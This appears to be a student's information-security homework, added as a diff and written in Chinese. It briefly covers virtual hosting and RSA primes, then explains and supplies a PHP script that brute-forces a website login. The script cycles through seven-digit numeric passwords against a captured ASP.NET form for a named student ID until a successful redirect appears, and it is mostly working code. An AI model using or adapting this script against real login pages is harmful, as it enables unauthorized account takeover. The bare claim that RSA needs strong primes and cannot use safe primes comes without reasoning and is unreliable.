@@ -1,0 +1,39 @@
+信息安全作业
+（13网络工程2班 李剑雄 1314080903220）
+为什么有些网站不能用ip访问？
+因为这个网站采用了“虚拟主机”的技术，虚拟主机技术就是在一台服务器里面运行几个网站，提供web，FTP，Mail等服务，不能用IP访问是因为你不知道要去服务器的哪个网站，如果要实现访问，则要通过域名解析，绑定域名来实现。
+RSA是否需要强素数，可以用安全素数替代吗？
+需要，不能
+自动破解网站的登录账号、密码（暴力破解）
+思路：
+假设这个网站是没有输入验证码，且不限制输入出错次数，而且这时候我们也知道登录的账号，接下来是要破解密码，这时候我们可以用类似（蜘蛛，爬虫）的网络机器人进行暴力破解，自动化执行破解。
+正常情况下，我们使用浏览器，填写用户名和密码，然后点击提交，信息就会被提交到服务器中，以网络封包的形式传递，这时我们要做到就是抓取网络包，模拟浏览器动作，提交关键信息到服务器中，
+其中：1）点击提交按钮后查看网络数据包，可通过浏览器自动的工具，例如按F12 按钮可以看到网络包
+     2）用到了php中的模拟登陆技术
+源代码框架：
+<?php 
+include("php_lib/LIB_http.php"); 
+error_reporting(0);//除去notice提示 
+$action="登陆页面提交的后台地址"; 
+$method="POST";//注意，大写，GET方法也一样 
+$ref="上连接地址，查看方法上面已讲"; 
+//$data_array[ ] 数组里面是网络包需要传递的固定关键字段，是要发送的数据，查看F12可知
+$data_array['yh']="1314080903220"; 
+$data_array['RadioButtonList1']="%D1%A7%C9%FA"; 
+$data_array['__VIEWSTATE']="dDwxNTYzNjUxNjgwO3Q8O2w8aTwxPjs%2BO2w8dDw7bDxpPDk%2BOz47bDx0PHA8O3A8bDxvbmNsaWNrOz47bDx3aW5kb3cuY2xvc2UoKVw7Oz4%2BPjs7Pjs%2BPjs%2BPjtsPENoZWNrQm94MTs%2BPsdJpL8Dhq6Cxz2MIORca2HjK5qQ"; 
+$data_array['Button1']="%B5%C7++%C2%BC"; 
+$data_array['CheckBox1']="on"; 
+for($pass=3700000; $pass<9999999;$pass++){ 
+$strpass=strval($pass); 
+$data_array['Password']=$strpass; 
+$response = http($target=$action,$ref,$method,$data_array,EXCL_HEAD); 
+$str = $response['STATUS']; 
+echo $pass." "; 
+if($str['url']=="登录成功后的跳转页面"){ 
+echo "\n\n\n the result is:".$pass."\n"; 
+return; 
+} 
+//echo $str['url']."\n"; 
+} 
+?> 
+
